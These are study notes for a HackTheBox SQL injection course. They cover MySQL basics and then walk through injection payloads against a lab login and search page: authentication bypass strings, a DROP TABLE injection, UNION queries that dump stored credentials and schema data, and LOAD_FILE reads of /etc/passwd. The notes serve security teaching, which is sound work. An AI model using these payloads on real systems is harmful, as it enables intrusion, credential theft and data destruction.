# SQL Injection Fundamentals
Notes for the HackTheBox learning module, SQL Injection Fundamentals.

## SQL Injection (SQLi)
A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database. In the most basic case, this is done by injecting a single quote (') or a double quote (") to escape the limits of user input and inject data directly into the SQL query. To retrieve our new query's output, we have to interpret it or capture it on the web application's front end.

# Intro to Databases
## Database Management Systems
A Database Management System (DBMS) helps create, define, host, and manage databases. Various kinds of DBMS were designed over time, such as file-based, Relational DBMS (RDBMS), NoSQL, Graph based, and Key/Value stores.

Some of the essential features of a DBMS include:
|Feature|	Description|
|:-:|:-:|
|Concurrency|	A real-world application might have multiple users interacting with it simultaneously. A DBMS makes sure that these concurrent interactions succeed without corrupting or losing any data.
|Consistency|	With so many concurrent interactions, the DBMS needs to ensure that the data remains consistent and valid throughout the database.
|Security|	DBMS provides fine-grained security controls through user authentication and permissions. This will prevent unauthorized viewing or editing of sensitive data.
|Reliability|	It is easy to backup databases and rolls them back to a previous state in case of data loss or a breach.
|Structured Query Language|	SQL simplifies user interaction with the database with an intuitive syntax supporting various operations.

DBMS often follow a 2 tier architecture.

Tier I usually consists of client-side applications such as websites or GUI programs.

Tier II is the middleware, which interprets these events and puts them in a form required by the DBMS. The DBMS receives queries from the second tier and performs the requested operations. These operations could include insertion, retrieval, deletion, or updating of data.

After processing, the DBMS returns any requested data or error codes in the event of invalid queries.

# Types of Databases
Databases, in general, are categorized into Relational Databases and Non-Relational Databases. Only Relational Databases utilize SQL, while Non-Relational databases utilize a variety of methods for communications.

## Relational Databases
A relational database is the most common type of database. It uses a schema, a template, to dictate the data structure stored in the database. Tables in a relational database are associated with keys that provide a quick database summary or access to the specific row or column when specific data needs to be reviewed. These tables, also called entities, are all related to each other.

## Non-relational Databases
A non-relational database (also called a NoSQL database) does not use tables, rows, and columns or prime keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored. Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible.

When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing such data. There are four common storage models for NoSQL databases:

- Key-Value
- Document-Based
- Wide-Column
- Graph

Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and have a key for each pair, and stores all of its data as its value.

The most common example of a NoSQL database is MongoDB.

# Intro to MySQL
## Structured Query Language (SQL)

SQL syntax can differ from one RDBMS to another. However, they are all required to follow the ISO standard for Structured Query Language. SQL can be used to perform the following actions:

- Retrieve data
- Update data
- Delete data
- Create new tables and databases
- Add / remove users
- Assign permissions to these users

### Command Line
he mysql utility is used to authenticate to and interact with a MySQL/MariaDB database. The -u flag is used to supply the username and the -p flag for the password. The -p flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file.

```
thossa00@htb[/htb]$ mysql -u root -p

Enter password: <password>
...SNIP...

mysql>

mysql -u root -h docker.hackthebox.eu -P 3306 -p  
```

MySQL expects command-line queries to be terminated with a semi-colon.

mysql> CREATE DATABASE users;

We can view the list of databases with SHOW DATABASES, and we can switch to the users database with the USE statement:

```
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+

mysql> USE users;

Database changed
```

SQL statements aren't case sensitive, which means 'USE users;' and 'use users;' refer to the same command. However, the database name is case sensitive, so we cannot do 'USE USERS;' instead of 'USE users;'. So, it is a good practice to specify statements in uppercase to avoid confusion.

### Tables
DBMS stores data in the form of tables. A table is made up of horizontal rows and vertical columns. The intersection of a row and a column is called a cell. Every table is created with a fixed set of columns, where each column is of a particular data type. A data type defines what kind of value is to be held by a column. Common examples are numbers, strings, date, time, and binary data.
```
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );

```

A list of tables in the current database can be obtained using the SHOW TABLES statement. In addition, the DESCRIBE keyword is used to list the table structure with its fields and data types.

```
mysql> SHOW TABLES;

+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
1 row in set (0.00 sec)

mysql> DESCRIBE logins;

+-----------------+--------------+
| Field           | Type         |
+-----------------+--------------+
| id              | int          |
| username        | varchar(100) |
| password        | varchar(100) |
| date_of_joining | date         |
+-----------------+--------------+
4 rows in set (0.00 sec)
```

Within the CREATE TABLE query, there are many properties that can be set for the table and each column. For example, we can set the id column to auto-increment using the AUTO_INCREMENT keyword, which automatically increments the id by one every time a new item is added to the table:

    id INT NOT NULL AUTO_INCREMENT,

The NOT NULL constraint ensures that a particular column is never left empty 'i.e., required field.' We can also use the UNIQUE constraint to ensures that the inserted item are always unique. 

Another important keyword is the DEFAULT keyword, which is used to specify the default value. For example, within the date_of_joining column, we can set the default value to Now(), which in MySQL returns the current date and time.

One of the most important properties is PRIMARY KEY, which we can use to uniquely identify each record in the table, referring to all data of a record within a table for relational databases

The final CREATE TABLE query will be as follows:

```
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```
![image](https://github.com/user-attachments/assets/968ad08d-f1ea-44b6-b400-84bdc741010d)

# SQL Statements
The INSERT statement is used to add new records to a given table. The statement following the below syntax:
```
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);

mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');

Query OK, 1 row affected (0.00 sec)
```

The example above shows how to add a new login to the logins table, with appropriate values for each column. However, we can skip filling columns with default values, such as id and date_of_joining. This can be done by specifying the column names to insert values into a table selectively:

```
mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');

Query OK, 1 row affected (0.00 sec)
```

We inserted a username-password pair in the example above while skipping the id and date_of_joining columns.

We can also insert multiple records at once by separating them with a comma:

```
mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');

Query OK, 2 rows affected (0.00 sec)
Records: 2  Duplicates: 0  Warnings: 0
```

## SELECT Statement
The general syntax to view the entire table or specific columns is as follows:
```
mysql> SELECT * FROM logins;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)


mysql> SELECT username,password FROM logins;

+---------------+------------+
| username      | password   |
+---------------+------------+
| admin         | p@ssw0rd   |
| administrator | adm1n_p@ss |
| john          | john123!   |
| tom           | tom123!    |
+---------------+------------+
4 rows in set (0.00 sec)
```

## DROP Statement
We can use DROP to remove tables and databases from the server.
```
mysql> DROP TABLE logins;

Query OK, 0 rows affected (0.01 sec)


mysql> SHOW TABLES;

Empty set (0.00 sec)
```
TIP: The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.

## ALTER Statement
We can use ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table. The below example adds a new column newColumn to the logins table using ADD:

```
mysql> ALTER TABLE logins ADD newColumn INT;

Query OK, 0 rows affected (0.01 sec)
```
To rename a column, we can use RENAME COLUMN:
```
mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;

Query OK, 0 rows affected (0.01 sec)
```
We can also change a column's datatype with MODIFY:
```
mysql> ALTER TABLE logins MODIFY newerColumn DATE;

Query OK, 0 rows affected (0.01 sec)
```
Finally, we can drop a column using DROP:
```
mysql> ALTER TABLE logins DROP newerColumn;

Query OK, 0 rows affected (0.01 sec)
```
We can use any of the above statements with any existing table, as long as we have enough privileges to do so.

## UPDATE Statement
While ALTER is used to change a table's properties, the UPDATE statement can be used to update specific records within a table, based on certain conditions. Its general syntax is:
```
mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;

Query OK, 3 rows affected (0.00 sec)
Rows matched: 3  Changed: 3  Warnings: 0


mysql> SELECT * FROM logins;

+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:47:16 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```
The query above updated all passwords in all records where the id was more significant than 1.

# Query Results
## Sorting Results
We can sort the results of any query using ORDER BY and specifying the column to sort by:
```
mysql> SELECT * FROM logins ORDER BY password;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```
By default, the sort is done in ascending order, but we can also sort the results by ASC or DESC:

It is also possible to sort by multiple columns, to have a secondary sort for duplicate values in one column:
```
mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;

+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:50:20 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```
## LIMIT results
In case our query returns a large number of records, we can LIMIT the results to what we want only, using LIMIT and the number of records we want. If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count:
```
mysql> SELECT * FROM logins LIMIT 1, 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```
NOTE: the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.

## WHERE Clause
To filter or search for specific data, we can use conditions with the SELECT statement using the WHERE clause, to fine-tune the results:
```
mysql> SELECT * FROM logins where username = 'admin';

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```
## LIKE Clause
Another useful SQL clause is LIKE, enabling selecting records by matching a certain pattern. The query below retrieves all records with usernames starting with admin:
```
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

The % symbol acts as a wildcard and matches all characters after admin. It is used to match zero or more characters. Similarly, the _ symbol is used to match exactly one character. The below query matches all usernames with exactly three characters in them:

```
mysql> SELECT * FROM logins WHERE username like '___';

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
+----+----------+----------+---------------------+
1 row in set (0.01 sec)
```

# SQL Operators
## AND Operator
The AND operator takes in two conditions and returns true or false based on their evaluation.
## OR Operator
The OR operator takes in two expressions as well, and returns true when at least one of them evaluates to true.
## NOT Operator
The NOT operator simply toggles a boolean value 'i.e. true is converted to false and vice versa'
## Symbol Operators
The AND, OR and NOT operators can also be represented as &&, || and !, respectively.
## Multiple Operator Precedence
SQL supports various other operations such as addition, division as well as bitwise operations. Thus, a query could have multiple expressions with multiple operations at once. The order of these operations is decided through operator precedence.

Here is a list of common operations and their precedence, as seen in the MariaDB Documentation:

Division (/), Multiplication (*), and Modulus (%)

Addition (+) and subtraction (-)

Comparison (=, >, <, <=, >=, !=, LIKE)

NOT (!)

AND (&&)

OR (||)

Operations at the top are evaluated before the ones at the bottom of the list.

# Use of SQL in Web Applications
Once a DBMS is installed and set up on the back-end server and is up and running, the web applications can start utilizing it to store and retrieve data.

For example, within a PHP web application, we can connect to our database, and start using the MySQL database through MySQL syntax, right within PHP.

Web applications also usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the databases:
```
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

If we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities.

## What is an Injection?

Sanitization refers to the removal of any special characters in user-input, in order to break any injection attempts.

Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it. This can occur by escaping user-input bounds by injecting a special character like ('), and then writing code to be executed, like JavaScript code or SQL in SQL Injections. Unless the user input is sanitized, it is very likely to execute the injected code and run it.

### SQL Injection
An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input. The previous example showed how user-input can be used within an SQL query, and it did not use any form of input sanitization.

In typical cases, the searchInput would be inputted to complete the query, returning the expected outcome. Any input we type goes into the following SQL query:
```
select * from logins where username like '%$searchInput'
```
In this case, if we write any SQL code, it would just be considered as a search term. For example, if we input SHOW DATABASES;, it would be executed as '%SHOW DATABASES;' The web application will search for usernames similar to SHOW DATABASES;. However, as there is no sanitization, in this case, we can add a single quote ('), which will end the user-input field, and after it, we can write actual SQL code. For example, if we search for 1'; DROP TABLE users; 

So, the final SQL query executed would be as follows:
```
select * from logins where username like '%1'; DROP TABLE users;'
```
We can escape the original query's bounds and have our newly injected query execute as well. Once the query is run, the users table will get deleted.

### Syntax Errors

The previous example of SQL injection would return an error:  we added another SQL query after a semi-colon (;). Though this is actually not possible with MySQL, it is possible with MSSQL and PostgreSQL. This is because of the last trailing character, where we have a single extra quote (') that is not closed, which causes a SQL syntax error when executed:

```
select * from logins where username like '%1'; DROP TABLE users;'
```
## Types of SQL Injections
<img width="2083" height="909" alt="image" src="https://github.com/user-attachments/assets/6536d08b-1496-4602-8959-7af1eb14b8e5" />

In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as In-band SQL injection, and it has two types: Union Based and Error Based.

With Union Based SQL injection, we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there. As for Error Based SQL injection, it is used when we can get the PHP or SQL errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.

In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as Blind SQL injection, and it also has two types: Boolean Based and Time Based.

With Boolean Based SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns true. As for Time Based SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.

Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as Out-of-band SQL injection.

# Subverting Query Logic
Before we start executing entire SQL queries, we will first learn to modify the original query by injecting the OR operator and using SQL comments to subvert the original query's logic. A basic example of this is bypassing web authentication

## Authentication Bypass

Example: Logging in as an Admin user on a website.

Our goal is to log in as the admin user without using the existing password. The current SQL query being executed when logging in legitemately is:
```
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

The page takes in the credentials, then uses the AND operator to select records matching the given username and password. If the MySQL database returns matched records, the credentials are valid, so the PHP code would evaluate the login attempt condition as true. If the condition evaluates to true, the admin record is returned, and our login is validated.

If the password or username is incorrect then the login will fail due to the wrong credentials leading to a false result from the AND operation.

### SQLi Discovery

Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

|Payload|	URL Encoded|
|:-:|:-:|
|'|	%27
|"|	%22
|#|	%23
|;|	%3B
|)|	%29

Example of injecting a single quote:
<img width="3602" height="560" alt="image" src="https://github.com/user-attachments/assets/89480c5e-ea37-40ce-869c-5868ed27f882" />
We see that a SQL error was thrown instead of the Login Failed message. The page threw an error because the resulting query was:

```
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

## OR Injection
We would need the query always to return true, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the OR operator in our SQL injection.

The MySQL documentation for operation precedence states that the AND operator would be evaluated before the OR operator. This means that if there is at least one TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE since the OR operator returns TRUE if one of its operands is TRUE.

An example of a condition that will always return true is '1'='1'. However, to keep the SQL query working and keep an even number of quotes, instead of using ('1'='1'), we will remove the last quote and use ('1'='1), so the remaining single quote from the original query would be in its place.

So, if we inject the below condition and have an OR operator between it and the original condition, it should always return true:
```
admin' or '1'='1

The final query from the OR operator:

SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';

```

This means the following:

- If username is admin

OR
- If 1=1 return true 'which always returns true'

AND

- If password is something

The AND operator will be evaluated first, and it will return false. Then, the OR operator would be evaluated, and if either of the statements is true, it would return true. Since 1=1 always returns true, this query will return true, and it will grant us access.

## Auth Bypass with OR operator
We were able to log in successfully as admin. However, what if we did not know a valid username? Let us try the same request with a different username this time. To successfully log in once again, we will need an overall true query. This can be achieved by injecting an OR condition into the password field, so it will always return true. Let us try something' or '1'='1 as the password.

<img width="3578" height="523" alt="image" src="https://github.com/user-attachments/assets/e640088c-9536-4f2f-b157-70ee78277464" />

The additional OR condition resulted in a true query overall, as the WHERE clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return true, we do not have to provide a test username and password and can directly start with the ' injection and log in with just ' or '1' = '1.

# Using Comments
SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL -- and #, in addition to an in-line comment /**/ (though this is not usually used in SQL injections). The -- can be used as follows:

```
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.

The # symbol can be used as well:
```
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

Note: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

he username is now admin, and the remainder of the query is now ignored as a comment.

Log in with the username admin'-- and anything as the password:
<img width="2737" height="476" alt="image" src="https://github.com/user-attachments/assets/509be901-301b-4c17-8807-d6c2ad85a980" />

SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. Expressions within the parenthesis take precedence over other operators and are evaluated first.
<img width="3602" height="577" alt="image" src="https://github.com/user-attachments/assets/65646c79-cd7d-4563-8d00-2c96cf774fff" />

The login failed due to a syntax error, as a closed one did not balance the open parenthesis. To execute the query successfully, we will have to add a closing parenthesis. Let us try using the username admin')-- to close and comment out the rest.
<img width="3003" height="512" alt="image" src="https://github.com/user-attachments/assets/cb60a0b9-7336-4a19-9ed5-ae35c7319f13" />

The query was successful, and we logged in as admin. The final query as a result of our input is:

```
SELECT * FROM logins WHERE (username = 'admin')
```

# Union Clause
So far, we have only been manipulating the original query to subvert the web application logic and bypass authentication, using the OR operator and comments. However, another type of SQL injection is injecting entire SQL queries executed along with the original query. This section will demonstrate this by using the MySQL Union clause to do SQL Union Injection.

The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.

EX:
```
mysql> SELECT * FROM ports UNION SELECT * FROM ships;
```

### Even Columns
A UNION statement can only operate on SELECT statements with an equal number of columns. For example, if we attempt to UNION two queries that have results with a different number of columns, we get the following error:

```
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

The above query results in an error, as the first SELECT returns one column and the second SELECT returns two. Once we have two queries that return the same number of columns, we can use the UNION operator to extract data from other tables and databases.

We can inject a UNION query into the input, such that rows from another table are returned:

```
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

### Un-even Columns
We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. For example, suppose we only had one column. In that case, we want to SELECT, we can put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.

The products table has two columns in the above example, so we have to UNION with two columns. If we only wanted to get one column 'e.g. username', we have to do username, 2, such that we have the same number of columns:
```
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. For example, if the original query used SELECT on a table with four columns, our UNION injection would be: 
```
UNION SELECT username, 2, 3, 4 from passwords-- '


mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

# Union Injection
## Detect number of columns
Before going ahead and exploiting Union-based queries, we need to find the number of columns selected by the server. There are two methods of detecting the number of columns:

- Using ORDER BY

The first way of detecting the number of columns is through the ORDER BY function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.
```
' order by 1-- -
```

- Using UNION
  
The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column UNION query:
```
cn' UNION select 1,2,3-- -
```

## Location of Injection
It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them. We cannot place our injection at the beginning, or its output will not be printed.

This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the @@version SQL query as a test and place it in the second column instead of the number 2:
```
cn' UNION select 1,@@version,3,4-- -
```

<img width="1698" height="440" alt="image" src="https://github.com/user-attachments/assets/698e3651-59d6-4bbb-b3a7-e4130caa251a" />


PWNBox EX: Use a Union injection to get the result of 'user()'

' UNION SELECT 1,user(), 3, 4-- -

cn' UNION SELECT 1,username,password,4 FROM users-- - # cn to filter existing table using second row data and only get results from users table.

# Database Enumeration
## MySQL Fingerprinting
Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.

As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL. However, this is a far-fetched guess, as many other databases can be used on either operating system or web server.

The following queries and their output will tell us that we are dealing with MySQL:

|Payload	|When to Use	|Expected Output	|Wrong Output|
|:-:|:-:|:-:|:-:|
|SELECT @@version|	When we have full query output|	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'|	In MSSQL it returns MSSQL version. Error with other DBMS.|
|SELECT POW(1,1)|	When we only have numeric output|	1|	Error with other DBMS|
|SELECT SLEEP(5)|	Blind/No Output|	Delays page response for 5 seconds and returns 0.|	Will not delay response with other DBMS|

The output 10.3.22-MariaDB-1ubuntu1 means that we are dealing with a MariaDB DBMS similar to MySQL. Since we have direct query output, we will not have to test the other payloads. Instead, we can test them and see what we get.

## INFORMATION_SCHEMA Database
o pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:

- List of databases
- List of tables within each database
- List of columns within each table

With the above information, we can form our SELECT statement to dump data from any column in any table within any database inside the DBMS. 

The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a SELECT statement. If we only specify a table's name for a SELECT statement, it will look for tables within the same database.

So, to reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
```
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

### SCHEMATA
The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server. It is used to obtain database names so we can then query them. The SCHEMA_NAME column contains all the database names currently present.
```
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Let us find out which database the web application is running to retrieve ports data from. We can find the current database with the SELECT database() query.

### TABLES
To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA Database.

The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns. The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to. This can be done similarly to how we found the database names.

For example, we can use the following payload to find the tables within the dev database:
```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
<img width="1710" height="640" alt="image" src="https://github.com/user-attachments/assets/3d917e5f-ae33-4ed9-aacc-93794594b43d" />

### COLUMNS
To dump the data of the credentials table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database. The COLUMNS table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this.
```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
<img width="1698" height="510" alt="image" src="https://github.com/user-attachments/assets/d8b53e16-3b14-42a7-9f72-18f8afe7ad32" />

The table has two columns named username and password. We can use this information and dump data from the table.

### DATA
Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. We can place username and password in place of columns 2 and 3:
```
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
# Reading Files
## Privileges
Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files.

First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges.

If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:
```
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Our UNION injection payload will be as follows:
```
' UNION SELECT 1, user(), 3, 4-- -

OR

' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
### User Privileges
Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

```
SELECT super_priv FROM mysql.user

UNION

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="current user"-- -
```

The query returns Y, which means YES, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:

```
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'current user'@'localhost'"-- -
```

## LOAD_FILE
The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:
```
SELECT LOAD_FILE('/etc/passwd');

cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.
```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
# Writing Files
Modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.

## Write File Privileges
To be able to write files to the back-end server using a MySQL database, we require three things:

- User with FILE privilege enabled
- MySQL global secure_file_priv variable not enabled
- Write access to the location we want to write to on the back-end server

### secure_file_priv
The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.

